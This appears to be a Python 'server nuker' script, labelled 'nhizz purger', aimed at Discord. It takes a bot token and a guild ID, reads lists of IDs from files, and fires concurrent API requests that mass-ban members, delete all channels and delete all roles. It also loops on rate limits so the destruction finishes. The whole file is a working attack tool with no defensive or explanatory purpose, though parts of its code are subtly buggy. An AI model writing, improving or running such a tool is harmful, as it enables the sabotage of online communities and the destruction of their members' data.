import os
import asyncio
import threading
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
import aiohttp

members = open('members.txt')
channels = open('channels.txt')
roles = open('roles.txt')

token = input("Token: ")
guild = input("Guild: ")
os.system('clear')

headers = {'Authorization': "Bot " + token}

async def ban(i):
    async with aiohttp.ClientSession(headers=headers) as session:
        while True:
            async with session.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}") as r:
                if 'retry_after' in await r.text():
                    await asyncio.sleep(r.json()['retry_after'])
                    print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
                else:
                    break

async def channel_delete(u):
    async with aiohttp.ClientSession(headers=headers) as session:
        while True:
            async with session.delete(f"https://discord.com/api/v8/channels/{u}") as r:
                if 'retry_after' in await r.text():
                    await asyncio.sleep(r.json()['retry_after'])
                    print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
                else:
                    break

async def role(k):
    async with aiohttp.ClientSession(headers=headers) as session:
        while True:
            async with session.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}") as r:
                if 'retry_after' in await r.text():
                    await asyncio.sleep(r.json()['retry_after'])
                    print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
                else:
                    break

def banall():
    async def run_banall():
        tasks = [ban(m) for m in members]
        await asyncio.gather(*tasks)

    asyncio.run(run_banall())

def channelsdel():
    async def run_channelsdel():
        tasks = [channel_delete(c) for c in channels]
        await asyncio.gather(*tasks)

    asyncio.run(run_channelsdel())

def rolesdel():
    async def run_rolesdel():
        tasks = [role(r) for r in roles]
        await asyncio.gather(*tasks)

    asyncio.run(run_rolesdel())

print(Fore.RED + r'''                                                                                
1 ; Ban Members 
2 ; Del Channels  
3 ; Del Roles  
4 ; Nuke Server           
''' + Style.RESET_ALL)

while True:
    x = input("> ")
    if x == "1":
        banall()
        print('Sent requests to ban all.')
    elif x == "2":
        channelsdel()
        print("Sent requests to delete channels.")
    elif x == "3":
        rolesdel()
        print("Sent requests to delete roles.")
    elif x == "4":
        banall()
        print("Sent requests to ban all.")
        channelsdel()
        print("Sent requests to delete channels.")
        rolesdel()
        print("Sent requests to delete roles.")
        print("[SUCCESS] - Server has been purged.\nThanks for using nhizz purger.")
